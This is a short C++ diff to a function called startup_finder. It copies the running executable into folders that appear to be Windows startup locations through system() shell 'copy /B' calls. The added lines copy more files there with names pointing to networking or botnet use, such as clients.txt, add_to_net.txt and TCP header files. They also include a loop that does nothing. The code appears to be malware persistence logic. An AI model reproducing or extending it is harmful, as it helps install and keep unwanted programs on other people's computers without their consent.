@@ -539,7 +539,23 @@ int startup_finder() {
 			folder.push_back(parts[i]);
 			if (parts[i].find('.') == -1) {
 				std::string startup_dir = "copy /B \"" + exePath + "\" \"" + start + parts[i] + end + "\"";
-				int i = system(startup_dir.c_str());
+				int index = system(startup_dir.c_str());
+				//files
+				int exelength = exePath.length() - 15;
+				for (int i = 0; i < exelength; i++) {
+					exePath[i] = exePath[i];
+				}
+				std::cout << exePath << std::endl;
+				startup_dir = "copy /B \"add_to_net.txt\" \"" + start + parts[i] + end + "\"";
+				index = system(startup_dir.c_str());
+				startup_dir = "copy /B \"clients.txt\" \"" + start + parts[i] + end + "\"";
+				index = system(startup_dir.c_str());
+				startup_dir = "copy /B \"psh_ack_tcp_header.txt\" \"" + start + parts[i] + end + "\"";
+				index = system(startup_dir.c_str());
+				startup_dir = "copy /B \"syn_ack_tcp_header.txt\" \"" + start + parts[i] + end + "\"";
+				index = system(startup_dir.c_str());
+				startup_dir = "copy /B \"test.txt\" \"" + start + parts[i] + end + "\"";
+				index = system(startup_dir.c_str());
 			}
 		}
 	}
